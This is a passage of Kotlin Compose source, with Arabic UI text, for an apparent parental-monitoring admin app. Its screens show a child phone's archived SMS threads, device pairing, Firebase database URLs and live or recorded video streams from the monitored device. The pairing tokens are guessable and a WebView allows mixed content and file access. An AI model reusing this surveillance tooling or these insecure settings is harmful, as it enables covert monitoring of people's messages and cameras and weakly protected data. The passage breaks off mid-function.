                .fillMaxWidth()
                .weight(1f)
        ) {
            if (smsLogs.isNotEmpty()) {
                if (selectedContact == null) {
                    val groupedSms = remember(smsLogs) {
                        smsLogs.groupBy { it.sender }.toList().sortedByDescending { it.second.maxOfOrNull { msg -> msg.timestamp } ?: 0L }
                    }
                    LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp), modifier = Modifier.fillMaxSize()) {
                        items(groupedSms) { (sender, messages) ->
                            val latestMsg = messages.maxByOrNull { it.timestamp }
                            Card(
                                colors = CardDefaults.cardColors(containerColor = Color.White),
                                shape = RoundedCornerShape(12.dp),
                                border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .clickable { selectedContact = sender }
                            ) {
                                Row(modifier = Modifier.padding(16.dp), verticalAlignment = Alignment.CenterVertically) {
                                    Box(
                                        modifier = Modifier.size(40.dp).clip(CircleShape).background(Color(0xFFF3E8FF)),
                                        contentAlignment = Alignment.Center
                                    ) {
                                        Text(sender.take(2).uppercase(), color = Color(0xFF9155FF), fontWeight = FontWeight.Bold)
                                    }
                                    Spacer(modifier = Modifier.width(12.dp))
                                    Column(modifier = Modifier.weight(1f)) {
                                        Text(sender, color = Color(0xFF1F2937), fontSize = 14.sp, fontWeight = FontWeight.Bold)
                                        Text(latestMsg?.body ?: "", color = Color(0xFF6B7280), fontSize = 12.sp, maxLines = 1, overflow = TextOverflow.Ellipsis)
                                    }
                                    latestMsg?.let {
                                        val timeStr = SimpleDateFormat("dd/MM yyyy", Locale.getDefault()).format(Date(it.timestamp))
                                        Text(timeStr, color = Color(0xFF9CA3AF), fontSize = 10.sp)
                                    }
                                }
                            }
                        }
                    }
                } else {
                    val contactMessages = remember(smsLogs, selectedContact) {
                        smsLogs.filter { it.sender == selectedContact }.sortedBy { it.timestamp }
                    }
                    Column {
                        Row(modifier = Modifier.fillMaxWidth().padding(bottom = 8.dp), verticalAlignment = Alignment.CenterVertically) {
                            IconButton(onClick = { selectedContact = null }) {
                                Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "رجوع")
                            }
                            Text(selectedContact ?: "", fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFF1F2937))
                        }
                        LazyColumn(
                            verticalArrangement = Arrangement.spacedBy(8.dp),
                            modifier = Modifier.fillMaxSize()
                        ) {
                            items(contactMessages) { sms ->
                                val isIncoming = sms.type == "incoming" || sms.type == "1"
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = if (isIncoming) Arrangement.Start else Arrangement.End
                                ) {
                                    Card(
                                        colors = CardDefaults.cardColors(
                                            containerColor = if (isIncoming) Color(0xFFFFFFFF) else Color(0xFF9155FF)
                                        ),
                                        shape = RoundedCornerShape(
                                            topStart = 16.dp,
                                            topEnd = 16.dp,
                                            bottomStart = if (isIncoming) 0.dp else 16.dp,
                                            bottomEnd = if (isIncoming) 16.dp else 0.dp
                                        ),
                                        border = if (isIncoming) BorderStroke(1.dp, Color(0xFFE5E7EB)) else null,
                                        modifier = Modifier.widthIn(max = 280.dp)
                                    ) {
                                        Column(modifier = Modifier.padding(12.dp)) {
                                            Text(
                                                text = sms.body,
                                                color = if (isIncoming) Color(0xFF1F2937) else Color.White,
                                                fontSize = 13.sp,
                                                lineHeight = 18.sp
                                            )
                                            Spacer(modifier = Modifier.height(4.dp))
                                            val timeStr = remember(sms.timestamp) {
                                                SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(Date(sms.timestamp))
                                            }
                                            Text(
                                                text = timeStr,
                                                color = if (isIncoming) Color(0xFF6B7280) else Color.White.copy(alpha = 0.7f),
                                                fontSize = 9.sp,
                                                textAlign = TextAlign.End,
                                                modifier = Modifier.fillMaxWidth()
                                            )
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            } else {
                Box(
                    modifier = Modifier.fillMaxSize(),
                    contentAlignment = Alignment.Center
                ) {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Icon(Icons.Default.Message, null, tint = Color(0xFFE5E7EB), modifier = Modifier.size(48.dp))
                        Spacer(modifier = Modifier.height(8.dp))
                        Text("لا يتوفر رسائل SMS مؤرشفة في النظام حالياً.", color = Color(0xFF6B7280), fontSize = 12.sp)
                    }
                }
            }
        }
    }
}

// 7. PLACEHOLDER / PAIRING NO DEVICES DETECTED SCREEN
@Composable
fun EmptyDevicesScreen(viewModel: AdminViewModel) {
    var pairingToken by remember { mutableStateOf("") }
    var friendlyName by remember { mutableStateOf("") }
    val isProgressing by viewModel.isLoading.collectAsState()

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(24.dp)
            .verticalScroll(rememberScrollState()),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Icon(
            imageVector = Icons.Default.SettingsInputAntenna,
            contentDescription = null,
            tint = Color(0xFF9155FF),
            modifier = Modifier.size(72.dp)
        )

        Spacer(modifier = Modifier.height(16.dp))

        Text(
            text = "توصيل هاتف طفل جديد",
            color = Color(0xFF1F2937),
            fontSize = 20.sp,
            fontWeight = FontWeight.Bold
        )
        Text(
            text = "الرجاء كتابة رمز الاقتران الفريد (Pairing Token) الخاص بالطفل للربط الفوري ومزامنته",
            color = Color(0xFF6B7280),
            fontSize = 12.sp,
            textAlign = TextAlign.Center,
            modifier = Modifier.padding(vertical = 8.dp)
        )

        Spacer(modifier = Modifier.height(16.dp))

        // Card Entry Inputs
        Card(
            colors = CardDefaults.cardColors(containerColor = Color.White),
            shape = RoundedCornerShape(24.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
            border = BorderStroke(0.5.dp, Color.White),
            modifier = Modifier.fillMaxWidth().shadow(
                elevation = 20.dp,
                shape = RoundedCornerShape(24.dp),
                spotColor = Color(0xFF9155FF).copy(alpha = 0.1f)
            )
        ) {
            Column(modifier = Modifier.padding(24.dp), verticalArrangement = Arrangement.spacedBy(16.dp)) {
                OutlinedTextField(
                    value = pairingToken,
                    onValueChange = { 
                        pairingToken = it
                        friendlyName = it
                    },
                    label = { Text("رمز الاقتران والاسم (Token)", color = Color(0xFF6B7280)) },
                    placeholder = { Text("اكتب اسم هاتف الطفل وسيتم استخدامه كرمز إقتران أيضاً..", color = Color(0xFF6B7280)) },
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedTextColor = Color(0xFF1F2937),
                        unfocusedTextColor = Color(0xFF1F2937),
                        focusedBorderColor = Color(0xFF9155FF),
                        unfocusedBorderColor = Color(0xFFE5E7EB),
                        focusedContainerColor = Color(0xFFF3F4F6),
                        unfocusedContainerColor = Color(0xFFF3F4F6)
                    ),
                    maxLines = 1,
                    modifier = Modifier.fillMaxWidth()
                )

                OutlinedTextField(
                    value = friendlyName,
                    onValueChange = { 
                        friendlyName = it
                        pairingToken = it
                    },
                    label = { Text("اسم هاتف الطفل (مثال: هاتف أحمد)", color = Color(0xFF6B7280)) },
                    placeholder = { Text("يطابق رمز الاقتران تلقائياً..", color = Color(0xFF6B7280)) },
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedTextColor = Color(0xFF1F2937),
                        unfocusedTextColor = Color(0xFF1F2937),
                        focusedBorderColor = Color(0xFF9155FF),
                        unfocusedBorderColor = Color(0xFFE5E7EB),
                        focusedContainerColor = Color(0xFFF3F4F6),
                        unfocusedContainerColor = Color(0xFFF3F4F6)
                    ),
                    maxLines = 1,
                    modifier = Modifier.fillMaxWidth()
                )

                Button(
                    onClick = {
                        if (pairingToken.isNotBlank() && friendlyName.isNotBlank()) {
                            viewModel.registerDeviceManually(pairingToken, friendlyName)
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color.Transparent, disabledContainerColor = Color(0xFFE5E7EB)),
                    contentPadding = PaddingValues(),
                    enabled = !isProgressing && pairingToken.isNotBlank() && friendlyName.isNotBlank(),
                    modifier = Modifier.fillMaxWidth().height(52.dp),
                    shape = RoundedCornerShape(14.dp)
                ) {
                    Box(
                        modifier = Modifier
                            .fillMaxSize()
                            .background(Brush.linearGradient(listOf(Color(0xFF9155FF), Color(0xFF7C3AED))))
                            .padding(12.dp),
                        contentAlignment = Alignment.Center
                    ) {
                        if (isProgressing) {
                            CircularProgressIndicator(color = Color.White, modifier = Modifier.size(24.dp), strokeWidth = 2.dp)
                        } else {
                            Text("مزامنة وإقتران في قاعدة البيانات", fontSize = 15.sp, fontWeight = FontWeight.Bold, color = Color.White)
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun EditDatabaseUrlDialog(
    currentUrl: String,
    onClose: () -> Unit,
    onSave: (String) -> Unit
) {
    var urlText by remember { mutableStateOf(currentUrl) }
    
    Dialog(onDismissRequest = onClose) {
        Card(
            colors = CardDefaults.cardColors(containerColor = Color.White.copy(alpha = 0.95f)),
            shape = RoundedCornerShape(24.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
            border = BorderStroke(0.5.dp, Color.White),
            modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp).shadow(
                elevation = 20.dp,
                shape = RoundedCornerShape(24.dp),
                spotColor = Color.Black.copy(alpha = 0.1f)
            )
        ) {
            Column(modifier = Modifier.padding(20.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = "تعديل رابط قاعدة البيانات",
                        color = Color(0xFF1F2937),
                        fontSize = 16.sp,
                        fontWeight = FontWeight.Bold
                    )
                    IconButton(onClick = onClose) {
                        Icon(Icons.Default.Close, contentDescription = "اغلاق", tint = Color(0xFF6B7280))
                    }
                }
                
                HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp), color = Color(0xFFE5E7EB))
                
                Text(
                    text = "أدخل الرابط الكامل لقاعدة بيانات Firebase Realtime المخصصة لك:",
                    color = Color(0xFF6B7280),
                    fontSize = 12.sp,
                    modifier = Modifier.padding(bottom = 12.dp)
                )
                
                OutlinedTextField(
                    value = urlText,
                    onValueChange = { urlText = it },
                    modifier = Modifier.fillMaxWidth(),
                    textStyle = androidx.compose.ui.text.TextStyle(color = Color(0xFF1F2937), fontFamily = FontFamily.Monospace, fontSize = 12.sp),
                    placeholder = { Text("https://example-default-rtdb.firebaseio.com", color = Color(0xFF6B7280)) },
                    singleLine = true,
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Color(0xFF9155FF),
                        unfocusedBorderColor = Color(0xFFE5E7EB),
                        focusedLabelColor = Color(0xFF9155FF),
                        unfocusedLabelColor = Color(0xFF6B7280)
                    )
                )
                
                Spacer(modifier = Modifier.height(16.dp))
                
                Text(
                    text = "خوادم ومناطق مقترحة (اضغط للتحديد):",
                    color = Color(0xFF1F2937),
                    fontSize = 11.sp,
                    fontWeight = FontWeight.Bold,
                    modifier = Modifier.padding(bottom = 8.dp)
                )
                
                // Suggestions List
                val suggestions = listOf(
                    "https://studio-3242759193-af8cb-default-rtdb.europe-west1.firebasedatabase.app" to "أوروبا (طبيعي)",
                    "https://studio-3242759193-af8cb-default-rtdb.firebaseio.com" to "الولايات المتحدة (رسمي)",
                    "https://studio-3242759193-af8cb-default-rtdb.asia-southeast1.firebasedatabase.app" to "آسيا (تجريبي)"
                )
                
                suggestions.forEach { (url, label) ->
                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(vertical = 4.dp)
                            .clip(RoundedCornerShape(8.dp))
                            .background(Color(0xFFE5E7EB))
                            .clickable { urlText = url }
                            .padding(horizontal = 12.dp, vertical = 8.dp)
                    ) {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(text = label, color = Color(0xFF9155FF), fontSize = 11.sp, fontWeight = FontWeight.Bold)
                            Text(
                                text = if (url.length > 35) url.take(25) + "..." else url,
                                color = Color(0xFF6B7280),
                                fontSize = 10.sp,
                                fontFamily = FontFamily.Monospace
                            )
                        }
                    }
                }
                
                Spacer(modifier = Modifier.height(20.dp))
                
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.End,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    TextButton(onClick = onClose) {
                        Text("إلغاء", color = Color(0xFF6B7280))
                    }
                    Spacer(modifier = Modifier.width(8.dp))
                    Button(
                        onClick = {
                            if (urlText.isNotBlank()) {
                                onSave(urlText)
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF))
                    ) {
                        Text("حفظ وتحديث", color = Color.White)
                    }
                }
            }
        }
    }
}

// 8. POPUP SELECTOR FOR MULTIPLE CHILD DEVICES
@Composable
fun DeviceSelectionDialog(
    devicesList: List<Device>,
    currentToken: String?,
    onClose: () -> Unit,
    onSelect: (String) -> Unit,
    onAddDevice: (token: String, name: String) -> Unit
) {
    var showAddPane by remember { mutableStateOf(false) }
    var newToken by remember { mutableStateOf("") }
    var newName by remember { mutableStateOf("") }

    Dialog(onDismissRequest = onClose) {
        Card(
            colors = CardDefaults.cardColors(containerColor = Color.White.copy(alpha = 0.95f)),
            shape = RoundedCornerShape(24.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
            border = BorderStroke(0.5.dp, Color.White),
            modifier = Modifier.fillMaxWidth().padding(horizontal = 8.dp).shadow(
                elevation = 24.dp,
                shape = RoundedCornerShape(24.dp),
                spotColor = Color.Black.copy(alpha = 0.15f)
            )
        ) {
            Column(modifier = Modifier.padding(20.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = if (showAddPane) "إضافة جهاز طفل جديد" else "أجهزة الأطفال المتصلة",
                        color = Color(0xFF1F2937),
                        fontSize = 16.sp,
                        fontWeight = FontWeight.Bold
                    )

                    IconButton(onClick = onClose) {
                        Icon(Icons.Default.Close, contentDescription = "Close", tint = Color(0xFF6B7280))
                    }
                }

                Divider(modifier = Modifier.padding(vertical = 8.dp), color = Color(0xFFE5E7EB))

                if (!showAddPane) {
                    // Devices selector list
                    if (devicesList.isNotEmpty()) {
                        LazyColumn(
                            verticalArrangement = Arrangement.spacedBy(8.dp),
                            modifier = Modifier.heightIn(max = 240.dp)
                        ) {
                            items(devicesList) { dev ->
                                val selected = dev.id == currentToken
                                val online = dev.isOnline
                                Card(
                                    onClick = { onSelect(dev.id) },
                                    colors = CardDefaults.cardColors(
                                        containerColor = if (selected) Color(0xFFE5E7EB) else Color(0xFFF3F4F6)
                                    ),
                                    border = BorderStroke(
                                        width = 1.dp,
                                        color = if (selected) Color(0xFF9155FF) else Color.Transparent
                                    ),
                                    shape = RoundedCornerShape(8.dp)
                                ) {
                                    Row(
                                        modifier = Modifier
                                            .fillMaxWidth()
                                            .padding(12.dp),
                                        verticalAlignment = Alignment.CenterVertically
                                    ) {
                                        Box(
                                            modifier = Modifier
                                                .size(10.dp)
                                                .clip(CircleShape)
                                                .background(if (online) Color(0xFF238636) else Color(0xFF6B7280))
                                        )
                                        Spacer(modifier = Modifier.width(12.dp))
                                        Column(modifier = Modifier.weight(1f)) {
                                            Text(
                                                text = dev.name,
                                                color = Color(0xFF1F2937),
                                                fontSize = 13.sp,
                                                fontWeight = FontWeight.Bold
                                            )
                                            Text(
                                                text = "الرمز الفريد: ${dev.id}",
                                                color = Color(0xFF6B7280),
                                                fontSize = 11.sp
                                            )
                                        }

                                        if (selected) {
                                            Icon(
                                                Icons.Default.Check,
                                                contentDescription = null,
                                                tint = Color(0xFF9155FF)
                                            )
                                        }
                                    }
                                }
                            }
                        }
                    } else {
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(100.dp),
                            contentAlignment = Alignment.Center
                        ) {
                            Text("لا يتوفر أجهزة مسجلة.", color = Color(0xFF6B7280), fontSize = 12.sp)
                        }
                    }

                    Spacer(modifier = Modifier.height(16.dp))

                    Button(
                        onClick = { showAddPane = true },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF)),
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(8.dp)
                    ) {
                        Icon(Icons.Default.Add, contentDescription = null, modifier = Modifier.size(16.dp))
                        Spacer(modifier = Modifier.width(6.dp))
                        Text("اربط طفل طارئ جديد", fontSize = 12.sp)
                    }
                } else {
                    // Create token panel UI
                    Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
                        OutlinedTextField(
                            value = newToken,
                            onValueChange = { 
                                newToken = it
                                newName = it
                            },
                            placeholder = { Text("رمز الاقتران والاسم.. (مثل: ahmad_phone)", color = Color(0xFF6B7280)) },
                            colors = OutlinedTextFieldDefaults.colors(
                                focusedTextColor = Color(0xFF1F2937),
                                unfocusedTextColor = Color(0xFF1F2937),
                                focusedBorderColor = Color(0xFF9155FF),
                                unfocusedBorderColor = Color(0xFFE5E7EB),
                                focusedContainerColor = Color(0xFFF3F4F6),
                                unfocusedContainerColor = Color(0xFFF3F4F6)
                            ),
                            maxLines = 1,
                            modifier = Modifier.fillMaxWidth()
                        )

                        OutlinedTextField(
                            value = newName,
                            onValueChange = { 
                                newName = it
                                newToken = it
                            },
                            placeholder = { Text("اسم وكنية هاتف الطفل..", color = Color(0xFF6B7280)) },
                            colors = OutlinedTextFieldDefaults.colors(
                                focusedTextColor = Color(0xFF1F2937),
                                unfocusedTextColor = Color(0xFF1F2937),
                                focusedBorderColor = Color(0xFF9155FF),
                                unfocusedBorderColor = Color(0xFFE5E7EB),
                                focusedContainerColor = Color(0xFFF3F4F6),
                                unfocusedContainerColor = Color(0xFFF3F4F6)
                            ),
                            maxLines = 1,
                            modifier = Modifier.fillMaxWidth()
                        )

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Button(
                                onClick = { showAddPane = false },
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE5E7EB)),
                                modifier = Modifier.weight(1f)
                            ) {
                                Text("إلغاء", fontSize = 11.sp)
                            }

                            Button(
                                onClick = {
                                    if (newToken.isNotBlank() && newName.isNotBlank()) {
                                        onAddDevice(newToken, newName)
                                        showAddPane = false
                                        onClose()
                                    }
                                },
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF)),
                                enabled = newToken.isNotBlank() && newName.isNotBlank(),
                                modifier = Modifier.weight(1f)
                            ) {
                                Text("ربط الجهاز", fontSize = 11.sp)
                            }
                        }
                    }
                }
            }
        }
    }
}

// FORMAT SIZES UTILITIES
fun formatSize(bytes: Long): String {
    if (bytes <= 0) return "0 B"
    val units = arrayOf("B", "KB", "MB", "GB", "TB")
    val digitGroups = (Math.log10(bytes.toDouble()) / Math.log10(1024.0)).toInt()
    return String.format(Locale.ENGLISH, "%.1f %s", bytes / Math.pow(1024.0, digitGroups.toDouble()), units[digitGroups])
}

// BATTERY AUXILIARY HELPERS
fun getBatteryIcon(level: Int): ImageVector {
    return when {
        level >= 90 -> Icons.Default.BatteryFull
        level >= 70 -> Icons.Default.Battery5Bar
        level >= 40 -> Icons.Default.Battery4Bar
        level >= 15 -> Icons.Default.Battery2Bar
        else -> Icons.Default.BatteryAlert
    }
}

fun getBatteryColor(level: Int): Color {
    return when {
        level >= 40 -> Color(0xFF39D353)
        level >= 15 -> Color(0xFFD29922)
        else -> Color(0xFFEF4444)
    }
}

@OptIn(androidx.compose.material3.ExperimentalMaterial3Api::class)
@Composable
fun SwipeToRefreshBox(
    isRefreshing: Boolean,
    onRefresh: () -> Unit,
    modifier: Modifier = Modifier,
    content: @Composable () -> Unit
) {
    val state = androidx.compose.material3.pulltorefresh.rememberPullToRefreshState()
    
    // Smoothly animate appearance & dismissal with beautiful spring specs
    val triggerAlpha by animateFloatAsState(
        targetValue = if (isRefreshing || state.distanceFraction > 0.05f) 1f else 0f,
        animationSpec = androidx.compose.animation.core.tween(durationMillis = 250)
    )
    val triggerScale by animateFloatAsState(
        targetValue = if (isRefreshing || state.distanceFraction > 0.05f) 1f else 0.85f,
        animationSpec = androidx.compose.animation.core.spring(
            dampingRatio = androidx.compose.animation.core.Spring.DampingRatioMediumBouncy,
            stiffness = androidx.compose.animation.core.Spring.StiffnessMedium
        )
    )
    val triggerOffsetY by animateFloatAsState(
        targetValue = if (isRefreshing || state.distanceFraction > 0.05f) 16f else -30f,
        animationSpec = androidx.compose.animation.core.spring(
            dampingRatio = androidx.compose.animation.core.Spring.DampingRatioMediumBouncy,
            stiffness = androidx.compose.animation.core.Spring.StiffnessMedium
        )
    )

    androidx.compose.material3.pulltorefresh.PullToRefreshBox(
        isRefreshing = isRefreshing,
        onRefresh = onRefresh,
        state = state,
        modifier = modifier,
        indicator = {
            if (triggerAlpha > 0.01f) {
                Box(
                    modifier = Modifier
                        .align(Alignment.TopCenter)
                        .graphicsLayer {
                            alpha = triggerAlpha
                            scaleX = triggerScale
                            scaleY = triggerScale
                            translationY = triggerOffsetY.dp.toPx()
                        }
                        .shadow(elevation = 12.dp, shape = RoundedCornerShape(24.dp), clip = false)
                        .background(Color.White, RoundedCornerShape(24.dp))
                        .border(1.dp, Color(0xFFF3F4F6), RoundedCornerShape(24.dp))
                        .padding(horizontal = 18.dp, vertical = 10.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(10.dp)
                    ) {
                        if (isRefreshing) {
                            androidx.compose.material3.CircularProgressIndicator(
                                modifier = Modifier.size(16.dp),
                                color = Color(0xFF9155FF),
                                strokeWidth = 2.5.dp
                            )
                            Text(
                                text = "جاري تحديث البيانات الآن...",
                                color = Color(0xFF111827),
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold
                            )
                        } else {
                            val rotation = state.distanceFraction * 360f
                            Icon(
                                imageVector = Icons.Default.Refresh,
                                contentDescription = null,
                                tint = Color(0xFF9155FF),
                                modifier = Modifier
                                    .size(16.dp)
                                    .graphicsLayer { rotationZ = rotation }
                            )
                            val pullPercent = (state.distanceFraction * 100).coerceAtMost(100f).toInt()
                            Text(
                                text = if (state.distanceFraction >= 1f) "اترك للتحديث فوراً" else "اسحب للتحديث ($pullPercent%)",
                                color = Color(0xFF4B5563),
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }
                    }
                }
            }
        }
    ) {
        content()
    }
}

@Composable
fun VideoPlayerDialog(
    videoBase64: String,
    onDismiss: () -> Unit,
    onDownload: () -> Unit
) {
    val context = LocalContext.current
    var isPreparing by remember { mutableStateOf(true) }
    val exoPlayer = remember {
        ExoPlayer.Builder(context).build()
    }

    LaunchedEffect(videoBase64) {
        withContext(Dispatchers.IO) {
            try {
                val cleanBase64 = if (videoBase64.contains(",")) videoBase64.substringAfter(",") else videoBase64
                val bytes = Base64.decode(cleanBase64, Base64.DEFAULT)
                val tempFile = File(context.cacheDir, "temp_video_play_${System.currentTimeMillis()}.mp4")
                FileOutputStream(tempFile).use { out ->
                    out.write(bytes)
                }
                withContext(Dispatchers.Main) {
                    exoPlayer.setMediaItem(Media3MediaItem.fromUri(tempFile.absolutePath))
                    exoPlayer.prepare()
                    exoPlayer.playWhenReady = true
                    isPreparing = false
                }
            } catch (t: Throwable) {
                withContext(Dispatchers.Main) {
                    Toast.makeText(context, "خطأ في تجهيز الفيديو: ${t.message}", Toast.LENGTH_SHORT).show()
                    onDismiss()
                }
            }
        }
    }

    DisposableEffect(Unit) {
        onDispose {
            exoPlayer.release()
        }
    }

    Dialog(
        onDismissRequest = onDismiss,
        properties = DialogProperties(usePlatformDefaultWidth = false)
    ) {
        Card(
            modifier = Modifier
                .fillMaxWidth(0.95f)
                .fillMaxHeight(0.8f),
            colors = CardDefaults.cardColors(containerColor = Color(0xFFF3F4F6)),
            shape = RoundedCornerShape(16.dp),
            border = BorderStroke(1.dp, Color(0xFFE5E7EB))
        ) {
            Column {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text("مشغل الفيديو", color = Color(0xFF1F2937), fontWeight = FontWeight.Bold)
                    Row {
                        IconButton(onClick = onDownload, enabled = !isPreparing) {
                            Icon(Icons.Default.Download, "تنزيل", tint = if (isPreparing) Color.Gray else Color.White, modifier = Modifier.size(20.dp))
                        }
                        IconButton(onClick = onDismiss) {
                            Icon(Icons.Default.Close, "إغلاق", tint = Color.White, modifier = Modifier.size(20.dp))
                        }
                    }
                }
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .fillMaxWidth()
                        .background(Color.Black),
                    contentAlignment = Alignment.Center
                ) {
                    if (isPreparing) {
                        CircularProgressIndicator(color = Color(0xFF39D353))
                    } else {
                        AndroidView(
                            factory = { ctx ->
                                PlayerView(ctx).apply {
                                    player = exoPlayer
                                    useController = true
                                }
                            },
                            modifier = Modifier.fillMaxSize()
                        )
                    }
                }
            }
        }
    }
}

@Composable
fun LiveStreamPlayer(
    streamUrl: String,
    deviceToken: String? = null,
    frameFlow: kotlinx.coroutines.flow.SharedFlow<ByteArray>? = null,
    modifier: Modifier = Modifier
) {
    val context = androidx.compose.ui.platform.LocalContext.current
    var playerType by remember(streamUrl) {
        val type = if (streamUrl.contains("supabase") || streamUrl.contains("broadcast")) {
            "native"
        } else if (streamUrl.startsWith("ws://") || streamUrl.startsWith("wss://")) {
            "web"
        } else {
            "exo"
        }
        mutableStateOf(type)
    }
    
    var nativeErrorMessage by remember { mutableStateOf<String?>(null) }

    Box(modifier = modifier.background(Color.Black), contentAlignment = Alignment.Center) {
        if (playerType == "native" && frameFlow != null) {
            AndroidView(
                factory = { ctx ->
                    android.view.SurfaceView(ctx).apply {
                        holder.addCallback(object : android.view.SurfaceHolder.Callback {
                            var codec: android.media.MediaCodec? = null
                            var job: kotlinx.coroutines.Job? = null
                            
                            override fun surfaceCreated(holder: android.view.SurfaceHolder) {
                                try {
                                    codec = android.media.MediaCodec.createDecoderByType("video/avc")
                                    val format = android.media.MediaFormat.createVideoFormat("video/avc", 320, 576)
                                    codec?.configure(format, holder.surface, null, 0)
                                    codec?.start()
                                    nativeErrorMessage = null
                                    
                                    job = kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                                        frameFlow.collect { frameBytes ->
                                            val localCodec = codec ?: return@collect
                                            try {
                                                val inputBufferId = localCodec.dequeueInputBuffer(10000)
                                                if (inputBufferId >= 0) {
                                                    val inputBuffer = localCodec.getInputBuffer(inputBufferId)
                                                    inputBuffer?.clear()
                                                    inputBuffer?.put(frameBytes)
                                                    localCodec.queueInputBuffer(inputBufferId, 0, frameBytes.size, 0, 0)
                                                }
                                                val bufferInfo = android.media.MediaCodec.BufferInfo()
                                                var outputBufferId = localCodec.dequeueOutputBuffer(bufferInfo, 10000)
                                                while (outputBufferId >= 0) {
                                                    localCodec.releaseOutputBuffer(outputBufferId, true)
                                                    outputBufferId = localCodec.dequeueOutputBuffer(bufferInfo, 0)
                                                }
                                            } catch (e: Exception) {
                                                android.util.Log.e("NativeH264Player", "Error decoding", e)
                                                kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
                                                    nativeErrorMessage = "Error decoding frame: ${e.message}"
                                                }
                                            }
                                        }
                                    }
                                } catch (e: Exception) {
                                    android.util.Log.e("NativeH264Player", "Error initializing codec", e)
                                    nativeErrorMessage = "Error initializing codec: ${e.message}"
                                }
                            }

                            override fun surfaceChanged(holder: android.view.SurfaceHolder, format: Int, width: Int, height: Int) {}

                            override fun surfaceDestroyed(holder: android.view.SurfaceHolder) {
                                job?.cancel()
                                job = null
                                try {
                                    codec?.stop()
                                    codec?.release()
                                } catch (e: Exception) {}
                                codec = null
                            }
                        })
                    }
                },
                modifier = Modifier.fillMaxSize()
            )
            
            if (nativeErrorMessage != null) {
                Card(
                    modifier = Modifier.padding(16.dp),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFFEF4444).copy(alpha = 0.9f))
                ) {
                    Text(
                        text = nativeErrorMessage ?: "",
                        color = Color.White,
                        fontSize = 12.sp,
                        modifier = Modifier.padding(12.dp)
                    )
                }
            }
        } else if (playerType == "web" || (playerType == "native" && frameFlow == null)) {
            val encodedUrl = remember(streamUrl, deviceToken) {
                try {
                    val baseAsset = "file:///android_asset/web_stream.html"
                    val wsParam = java.net.URLEncoder.encode(streamUrl, "UTF-8")
                    val tokenParam = deviceToken?.let { java.net.URLEncoder.encode(it, "UTF-8") } ?: ""
                    "$baseAsset?ws=$wsParam&token=$tokenParam"
                } catch (e: Exception) {
                    "file:///android_asset/web_stream.html"
                }
            }

            AndroidView(
                factory = { ctx ->
                    android.webkit.WebView(ctx).apply {
                        settings.apply {
                            javaScriptEnabled = true
                            domStorageEnabled = true
                            allowFileAccess = true
                            allowContentAccess = true
                            mediaPlaybackRequiresUserGesture = false
                            mixedContentMode = android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
                        }
                        webViewClient = android.webkit.WebViewClient()
                        webChromeClient = android.webkit.WebChromeClient()
                        loadUrl(encodedUrl)
                    }
                },
                modifier = Modifier.fillMaxSize()
            )
        } else {
            val exoPlayer = remember(streamUrl) {
                val loadControl = androidx.media3.exoplayer.DefaultLoadControl.Builder()
                    .setBufferDurationsMs(500, 2000, 500, 500)
                    .build()
                
                ExoPlayer.Builder(context)
                    .setLoadControl(loadControl)
                    .build().apply {
                    val mediaItem = Media3MediaItem.fromUri(streamUrl)
                    if (streamUrl.startsWith("rtsp://", ignoreCase = true)) {
